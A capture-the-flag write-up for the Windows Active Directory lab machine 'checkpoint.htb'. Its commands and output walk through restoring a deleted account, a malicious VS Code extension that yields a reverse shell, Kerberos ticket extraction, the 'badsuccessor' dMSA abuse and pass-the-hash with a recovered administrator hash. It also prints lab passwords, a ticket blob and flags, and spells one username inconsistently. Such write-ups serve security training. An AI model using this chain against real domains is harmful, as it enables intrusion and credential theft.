# checkpoint.htb

## checkpoint.htb

> **OS:** Windows\
> **Difficulty:** Medium\
> **IP:** `10.10.x.x`\
> **Date:** 24-06-2026

As is common in real life pentests, you will start the Checkpoint box with credentials for the following account `alex.turner` / `Checkpoint2024!`

***

### TL;DR

From the account alex.turner it is possible to restore deleted AD object, this returns us the user mark.davies. mark.davies also uses the same password as alex. After that, mark can upload a malicious .vsix file, get a shell, then abuse the badsuccessor exploit that creates a DMSA account with the permissions of the account svc\_deploy. This leads to a share with a .vmem file, which can be parsed with the program vmkatz in order to get the administrator hash.

**Chain:** `alex.turner` > `mark.davies` > `malicious vsix file` > `badsuccessor` > `retrieve .vmem file` > `parse with VMKATZ & get admin NT hash`

***

### Box Info

|                |                             |
| -------------- | --------------------------- |
| **Name**       | checkpoint.htb              |
| **OS**         | Windows                     |
| **Difficulty** | Medium                      |
| **Release**    | Released on 13th June, 2026 |
| **Key skills** | Windows AD, Kerberos, vsix  |

***

### 1. Recon

#### 1.1 Port scan

```bash
# Nmap 7.99 scan initiated Sat Jun 13 12:27:19 2026 as: /usr/lib/nmap/nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -p- -oN /opt/_NOTES/results/checkpoint/checkpoint.htb/scans/_full_tcp_nmap.txt -oX /opt/_NOTES/results/checkpoint/checkpoint.htb/scans/xml/_full_tcp_nmap.xml checkpoint.htb
Nmap scan report for checkpoint.htb (10.129.15.77)
Host is up, received user-set (0.029s latency).
rDNS record for 10.129.15.77: DC01.checkpoint.htb
Scanned at 2026-06-13 12:27:19 CEST for 202s
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 127 Simple DNS Plus
88/tcp    open  kerberos-sec  syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2026-06-14 16:57:23Z)
135/tcp   open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack ttl 127
464/tcp   open  kpasswd5?     syn-ack ttl 127
593/tcp   open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack ttl 127
3268/tcp  open  ldap          syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: checkpoint.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack ttl 127
5985/tcp  open  http          syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        syn-ack ttl 127 .NET Message Framing
49664/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49673/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49674/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49683/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49704/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
49712/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022|2012|2016 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022 cpe:/o:microsoft:windows_server_2012:r2 cpe:/o:microsoft:windows_server_2016
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Microsoft Windows Server 2022 (88%), Microsoft Windows Server 2012 R2 (85%), Microsoft Windows Server 2016 (85%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.99%E=4%D=6/13%OT=53%CT=%CU=%PV=Y%DS=2%DC=T%G=N%TM=6A2D3151%P=aarch64-unknown-linux-gnu)
SEQ(SP=106%GCD=2%ISR=109%TI=I%II=I%SS=S%TS=A)
SEQ(SP=107%GCD=1%ISR=103%TI=I%II=I%SS=S%TS=A)
OPS(O1=M552NW8ST11%O2=M552NW8ST11%O3=M552NW8NNT11%O4=M552NW8ST11%O5=M552NW8ST11%O6=M552ST11)
WIN(W1=FFFF%W2=FFFF%W3=FFFF%W4=FFFF%W5=FFFF%W6=FFFF)
ECN(R=Y%DF=Y%TG=80%W=FFFF%O=M552NW8NNS%CC=Y%Q=)
T1(R=Y%DF=Y%TG=80%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=80%CD=Z)

Uptime guess: 0.006 days (since Sat Jun 13 12:22:22 2026)
Network Distance: 2 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: Incremental
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-06-14T16:58:28
|_  start_date: N/A
|_clock-skew: 1d06h28m23s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 58029/tcp): CLEAN (Timeout)
|   Check 2 (port 17994/tcp): CLEAN (Timeout)
|   Check 3 (port 61807/udp): CLEAN (Timeout)
|   Check 4 (port 4165/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

TRACEROUTE (using port 139/tcp)
HOP RTT      ADDRESS
1   28.80 ms 10.10.14.1
2   29.27 ms DC01.checkpoint.htb (10.129.15.77)

Read data files from: /usr/share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jun 13 12:30:41 2026 -- 1 IP address (1 host up) scanned in 202.20 seconds
```

#### 1.2 Initial observations

* Hostname / domain: dc01.checkpoint.htb
*   Added to `/etc/hosts`:<br>

    ```
    10.10.x.x   DC01.checkpoint.htb checkpoint.htb DC01
    ```

#### 1.3 bloody-ad output

Run `bloody-ad` with the following command to list the write permissions available to `alex.turner`. The command returns the following output:

```bash
bloodyAD -u alex.turner -p 'Checkpoint2024!' -d checkpoint.htb --host dc01.checkpoint.htb get writable
```

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.15.31.png" alt=""><figcaption></figcaption></figure>

This shows that `alex.turner` has write access to the `mark.davies` AD object and can therefore restore it.

### 2. Foothold / Initial Access

#### 2.1 Description

To gain a foothold, `alex.turner` first restores the `mark.davies` AD object. `mark.davies` then uploads a malicious VSIX extension to the devdrop share and gains a local shell as `ryan.brookley`.

#### 2.2 Exploitation

**2.2.1 - restoring the AD object**

```bash
# 1. restore the AD object mark.davies
bloodyAD --host DC01.checkpoint.htb -d checkpoint.htb -u 'alex.turner' -p 'Checkpoint2024!' set restore 'mark.davies'

# 2. verify with a password spray that the password of mark.davies is also Checkpoint2024!
nxc smb dc01 -u 'mark.davies' -p 'Checkpoint2024!'
```

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.23.17.png" alt=""><figcaption></figcaption></figure>

**2.2.2 - uploading a malicious vsix file**

```bash
# 1. Note the share description and that you have write permissions
nxc smb dc01 -u 'mark.davies' -p 'Checkpoint2024!' --shares

# 2. search for an vsix reverse shell generator and create a reverse shell file
https://github.com/Goultarde/vsix_revshell.py
```

The following screenshot shows the shares available to `mark.davies`.

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.31.07.png" alt=""><figcaption></figcaption></figure>

**And at last, generate the .vsix reverse shell**

{% file src="../.gitbook/assets/vsix_revshell.py" %}

**generate the vsix reverse shell**

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.46.31.png" alt=""><figcaption></figcaption></figure>

**upload the vsix reverse shell & retrieve the reverse shell**

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 10.49.12.png" alt=""><figcaption></figcaption></figure>

**Result:**

```powershell
# Proof of shell / access
rlwrap nc -lvnp 5001
listening on [any] 5001 ...
connect to [10.10.14.195] from (UNKNOWN) [10.129.21.24] 65361

PS C:\Program Files\Microsoft VS Code> whoami
checkpoint\ryan.brooks
PS C:\Program Files\Microsoft VS Code> ipconfig

Windows IP Configuration
Ethernet adapter Ethernet0 2:

   Connection-specific DNS Suffix  . : .htb
   IPv6 Address. . . . . . . . . . . : dead:beef::2a92:ad53:c3cb:cffd
   Link-local IPv6 Address . . . . . : fe80::71be:9287:df30:86e7%5
   IPv4 Address. . . . . . . . . . . : 10.129.21.24
   Subnet Mask . . . . . . . . . . . : 255.255.0.0
   Default Gateway . . . . . . . . . : fe80::250:56ff:feb0:4ef9%5
                                       10.129.0.1
PS C:\Program Files\Microsoft VS Code> cat c:/users/ryan.brooks/desktop/user.txt
a2e3da7c0d7a15b5deba60f5218dd851
```

***

### 3. Privilege Escalation

#### 3.1 Description

To escalate privileges, use the `badsuccessor` exploit to impersonate `svc_deploy`. Use `bloody-ad` to obtain a valid TGT with the required permissions. Then access the `VMBackups` share, download the `.vmem` file, and extract the Administrator NT hash with `vmkatz`.

#### 3.1 badsuccessor enumeration

validate the badsuccessor possibilities with nxc:

```bash
nxc ldap 10.129.21.24 -u alex.turner -p 'Checkpoint2024!' -M badsuccessor
```

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.32.30.png" alt=""><figcaption></figcaption></figure>

#### 3.2 Enumeration as ryan.brooke

```bash
# 1. Generate a TGT as the user ryan.brooke utilizing rubeus.exe
.\rubeus_dnf_4.5.exe tgtdeleg /nowrap

# result:
doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu4ZDdruHMQocvYYit4sPw4T2ixDSlwf7zPcrhJB85x4r13EVhY8SpUJ7C2PXlpVboDsMSdHvdspc3fOQKaSj1594XRbOrcqnnQgXKuijkrKVg3/zFLODnMb1aglDWPdWPrAud9CHIEa+WYAdFhjoPG4LPXgkjXgXNdWPBr+uQOLaBMuIfAAWMhPU+9Q33x/1v9SCKZH6PH9rwynEnifc+5Y4zL0MTyzISS9Kov5H99V8wOoRSTPMWRI4fM6fCchxc/2KTXBa/OfA5km2mCcJDTsHUDGeiZWrzowzcPrTvgrrKgYQXIuTRLj6QnMkjcHJzUFKqsdUk/YGfXuKQ0GOFhcGEg/jQJ9kbCDPbVKEhcJo9KeBmoX16QtgjCQdImaTMHbcZRzHrDNIrngMGcMmZjCaUla2lADGlg4v72Z09Z5Fek4eo7O1+KJdPCko20gTHjNJNE8/Vl2C84ancPSVT2LqtHajqehJbcSKbxWp16sAFVUC2aYMlk70a4c9ZemDC2ggc64NayZKqAVfO06/paCDPqkSALZ/I0Un0RXpDRgYrezH3e2CF3O0dePU7nSvieGjyajqbmqrjolRQILnCBVl7RhCmqX7eiOpk8mipPPgp0tlJpmQA2WfWcJ3o1Srn3rlmm6e1aRH6IGioaw9w630nD072pcyZc7Hf9GIF4uXL86q/OrRxYCT3bxN8u1ScnTisLJIa8gdbtFFju+k3Z7pN2pk6nkZ3wEHClIpZWqIW23bvuhVFplF3I6XNfZ1+kUtPItjgmmTgCHj+IM2X2JVhc0BKc6fiCMESQ8dWZ00NaTx5hNvL0FKS2ETJbK7rSFbufSHCFUA+Lqkeoev0GURJpTJ/ct3xIBj5n7qfhqqeUXl0fJTdM9GKA2kDczQbzlTo1YB71yorDEt2163mPIDyDB3KdxunUesEvLSAayfaUsPPrFQq4kAlWmg5kpJ/HO1MNkMN3gCrH2zx/P1Esy2TAjezApv+RXAP01+/SS0SrvfUo8YP8zVgp0LKEXuOhmst4wcZ4HwX3vfkLymRRqxeCOM45C0fzXH15D8S2Mo9EEPHX7tozvbj54xd1guk4iVG8QTKzWNCDFCEt3d6ke6nbbQM/dAA43h06zUU2r2cUrEMXJyMIPI9EQa+SPV/StY5N4r18QBfsu3i0TQwu8UwEH9xFFq0GU1yqrAOezjbT9gwOp7nabTI9gzIj/0ciV7ozQu9ic6S15rHWDAxb/OIi8roNcIlhAgRLsmdM1134eDxITATaDDIeMHIyubyV1BEPnJtFZOU6wGvtu+cF+ZUt+GN2CPMseshhCrJ/POIs7vq+qBO5Fo/KXUECTQQp8DCamPRJ0PXTTFN7CTXboKsQDah9uZZZDOzEN4B1nw6UNb/LCQ6ptdyRx0xjoULvJo/IoRkMYQxu/j5g4g89c/kNV4d67dUUz4P86RmhbHuUI9Ol509ymEn9gbElmx1ObctsAIU8SQDAjQ4M/VrbBUmxAPGQ/mGS0qXv/y9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgOm5r5MbJdtE+wVXrm53vL76fisMqmNfMhQwSt9yhHHChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyNDE2MDM1N1qmERgPMjAyNjA2MjUwMjAzNTdapxEYDzIwMjYwNzAxMTYwMzU3WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=

# 2. Decode the .kirbi file, then convert it to a ccache file
┌──(root㉿kali)-[/opt/…/results/checkpoint/exploit/tmp]
└─# cat ryan-encoded.kirbi 
doIF1DCCBdCgAwIBBaEDAgEWooIE0DCCBMxhggTIMIIExKADAgEFoRAbDkNIRUNLUE9JTlQuSFRCoiMwIaADAgECoRowGBsGa3JidGd0Gw5DSEVDS1BPSU5ULkhUQqOCBIQwggSAoAMCARKhAwIBAqKCBHIEggRu4ZDdruHMQocvYYit4sPw4T2ixDSlwf7zPcrhJB85x4r13EVhY8SpUJ7C2PXlpVboDsMSdHvdspc3fOQKaSj1594XRbOrcqnnQgXKuijkrKVg3/zFLODnMb1aglDWPdWPrAud9CHIEa+WYAdFhjoPG4LPXgkjXgXNdWPBr+uQOLaBMuIfAAWMhPU+9Q33x/1v9SCKZH6PH9rwynEnifc+5Y4zL0MTyzISS9Kov5H99V8wOoRSTPMWRI4fM6fCchxc/2KTXBa/OfA5km2mCcJDTsHUDGeiZWrzowzcPrTvgrrKgYQXIuTRLj6QnMkjcHJzUFKqsdUk/YGfXuKQ0GOFhcGEg/jQJ9kbCDPbVKEhcJo9KeBmoX16QtgjCQdImaTMHbcZRzHrDNIrngMGcMmZjCaUla2lADGlg4v72Z09Z5Fek4eo7O1+KJdPCko20gTHjNJNE8/Vl2C84ancPSVT2LqtHajqehJbcSKbxWp16sAFVUC2aYMlk70a4c9ZemDC2ggc64NayZKqAVfO06/paCDPqkSALZ/I0Un0RXpDRgYrezH3e2CF3O0dePU7nSvieGjyajqbmqrjolRQILnCBVl7RhCmqX7eiOpk8mipPPgp0tlJpmQA2WfWcJ3o1Srn3rlmm6e1aRH6IGioaw9w630nD072pcyZc7Hf9GIF4uXL86q/OrRxYCT3bxN8u1ScnTisLJIa8gdbtFFju+k3Z7pN2pk6nkZ3wEHClIpZWqIW23bvuhVFplF3I6XNfZ1+kUtPItjgmmTgCHj+IM2X2JVhc0BKc6fiCMESQ8dWZ00NaTx5hNvL0FKS2ETJbK7rSFbufSHCFUA+Lqkeoev0GURJpTJ/ct3xIBj5n7qfhqqeUXl0fJTdM9GKA2kDczQbzlTo1YB71yorDEt2163mPIDyDB3KdxunUesEvLSAayfaUsPPrFQq4kAlWmg5kpJ/HO1MNkMN3gCrH2zx/P1Esy2TAjezApv+RXAP01+/SS0SrvfUo8YP8zVgp0LKEXuOhmst4wcZ4HwX3vfkLymRRqxeCOM45C0fzXH15D8S2Mo9EEPHX7tozvbj54xd1guk4iVG8QTKzWNCDFCEt3d6ke6nbbQM/dAA43h06zUU2r2cUrEMXJyMIPI9EQa+SPV/StY5N4r18QBfsu3i0TQwu8UwEH9xFFq0GU1yqrAOezjbT9gwOp7nabTI9gzIj/0ciV7ozQu9ic6S15rHWDAxb/OIi8roNcIlhAgRLsmdM1134eDxITATaDDIeMHIyubyV1BEPnJtFZOU6wGvtu+cF+ZUt+GN2CPMseshhCrJ/POIs7vq+qBO5Fo/KXUECTQQp8DCamPRJ0PXTTFN7CTXboKsQDah9uZZZDOzEN4B1nw6UNb/LCQ6ptdyRx0xjoULvJo/IoRkMYQxu/j5g4g89c/kNV4d67dUUz4P86RmhbHuUI9Ol509ymEn9gbElmx1ObctsAIU8SQDAjQ4M/VrbBUmxAPGQ/mGS0qXv/y9o4HvMIHsoAMCAQCigeQEgeF9gd4wgduggdgwgdUwgdKgKzApoAMCARKhIgQgOm5r5MbJdtE+wVXrm53vL76fisMqmNfMhQwSt9yhHHChEBsOQ0hFQ0tQT0lOVC5IVEKiGDAWoAMCAQGhDzANGwtyeWFuLmJyb29rc6MHAwUAYKEAAKURGA8yMDI2MDYyNDE2MDM1N1qmERgPMjAyNjA2MjUwMjAzNTdapxEYDzIwMjYwNzAxMTYwMzU3WqgQGw5DSEVDS1BPSU5ULkhUQqkjMCGgAwIBAqEaMBgbBmtyYnRndBsOQ0hFQ0tQT0lOVC5IVEI=
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/opt/…/results/checkpoint/exploit/tmp]
└─# cat ryan-encoded.kirbi | base64 -d > ryan-decoded.kirbi
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/opt/…/results/checkpoint/exploit/tmp]
└─# ticketConverter.py ryan-decoded.kirbi ryan.ccache    
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] converting kirbi to ccache...
[+] done
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/opt/…/results/checkpoint/exploit/tmp]
└─# export KRB5CCNAME=$(pwd)/ryan.ccache            
                                                                                                                                                                                                                                           
┌──(root㉿kali)-[/opt/…/results/checkpoint/exploit/tmp]
└─# nxc smb dc01 --use-kcache --shares
SMB         dc01            445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:checkpoint.htb) (signing:True) (SMBv1:None)
SMB         dc01            445    DC01             [+] CHECKPOINT.HTB\ryan.brooks from ccache

# 3. Execute the badsuccessor exploit with bloodyAD
bloodyAD -k ccache=./ryan.ccache -u ryan.brooks --dc-ip 10.129.21.24 --host DC01.checkpoint.htb -d checkpoint.htb add badsuccessor -t "CN=svc_deploy,OU=ServiceAccounts,DC=checkpoint,DC=htb" --ou "OU=DMSAHolder,DC=checkpoint,DC=htb" pentest_dmsa
```

After executing the bloodyAD command, a .ccache file will be generated that holds the credentials to the newly made machine account.

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.20.13.png" alt=""><figcaption></figcaption></figure>

After retrieving the `.ccache` file, set `KRB5CCNAME` to that ticket. Then authenticate as `pentest_dmsa`. This account has the same permissions as `svc_deploy account`.

#### 3.2 Exploitation as pentest\_dmsa

```bash
# 1. enumerate the shares as the pentest_dmsa user
nxc smb dc01 --use-kcache --shares
```

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.21.03.png" alt=""><figcaption></figcaption></figure>

After checking what shares you have read permissions to, navigate to the VMBackups share and download the .vmem file

```bash
smbclient.py -k -no-pass 'dc01'.'checkpoint'.'htb'                 
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

Type help for list of commands
# shares
ADMIN$
C$
DevDrop
IPC$
NETLOGON
SYSVOL
VMBackups
# use VMBackups
# ls
drw-rw-rw-          0  Wed May 13 15:58:05 2026 .
drw-rw-rw-          0  Sat May  9 16:42:27 2026 ..
drw-rw-rw-          0  Wed May 13 15:58:18 2026 NightlyBackup_2024-11-01
# cd NightlyBackup_2024-11-01
# ls
drw-rw-rw-          0  Wed May 13 15:58:18 2026 .
drw-rw-rw-          0  Wed May 13 15:58:05 2026 ..
drw-rw-rw-          0  Wed May 13 15:58:18 2026 memory forensics
# cd memory forensics
# ls
drw-rw-rw-          0  Wed May 13 15:58:18 2026 .
drw-rw-rw-          0  Wed May 13 15:58:18 2026 ..
-rw-rw-rw-  106496000  Wed May 13 15:58:18 2026 Windows Server 2019-000001.vmdk
-rw-rw-rw- 2147483648  Wed May 13 15:58:18 2026 Windows Server 2019-Snapshot1.vmem
-rw-rw-rw-  138164859  Fri May 15 00:32:32 2026 Windows Server 2019-Snapshot1.vmsn
-rw-rw-rw-     270840  Wed May 13 15:58:18 2026 Windows Server 2019.nvram
-rw-rw-rw-       7642  Wed May 13 15:58:18 2026 Windows Server 2019.scoreboard
-rw-rw-rw- 10199695360  Wed May 13 15:58:18 2026 Windows Server 2019.vmdk
-rw-rw-rw-        502  Wed May 13 15:58:18 2026 Windows Server 2019.vmsd
-rw-rw-rw-       2749  Wed May 13 15:58:18 2026 Windows Server 2019.vmx
-rw-rw-rw-        274  Wed May 13 15:58:18 2026 Windows Server 2019.vmxf
# get Windows Server 2019-Snapshot1.vmem
```

Once the 2 GB `.vmem` file is downloaded, parse it with `vmkatz` to recover the Administrator hash.

<figure><img src="../.gitbook/assets/Scherm­afbeelding 2026-06-24 om 11.26.38.png" alt=""><figcaption></figcaption></figure>

**Result:**

From there on, you can authenticate with evil-winrm to the target and print the root flag

```bash
┌──(root㉿kali)-[/opt/…/results/checkpoint/loot/svc_deploy]
└─# evil-winrm -i 10.129.21.24 -u administrator -H f29e9c014295b9b32139b09a2790be3b
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../../
*Evil-WinRM* PS C:\Users> ls

    Directory: C:\Users

Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-----         5/25/2026   6:26 PM                Administrator
d-----         5/25/2026   6:34 PM                max.palmer
d-r---          5/9/2026  12:30 AM                Public
d-----         5/21/2026   4:19 PM                ryan.brooks


*Evil-WinRM* PS C:\Users> cd max.palmer
*Evil-WinRM* PS C:\Users\max.palmer> ls


    Directory: C:\Users\max.palmer


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
d-r---         5/25/2026   6:34 PM                Contacts
d-r---         5/25/2026   6:37 PM                Desktop
d-r---         5/25/2026   6:34 PM                Documents
d-r---         5/25/2026   6:34 PM                Downloads
d-r---         5/25/2026   6:34 PM                Favorites
d-r---         5/25/2026   6:34 PM                Links
d-r---         5/25/2026   6:34 PM                Music
d-r---         5/25/2026   6:34 PM                Pictures
d-r---         5/25/2026   6:34 PM                Saved Games
d-r---         5/25/2026   6:34 PM                Searches
d-r---         5/25/2026   6:34 PM                Videos


*Evil-WinRM* PS C:\Users\max.palmer> cat desktop/root.txt
84456db34b4dee50105d4359ba25bc3e

```
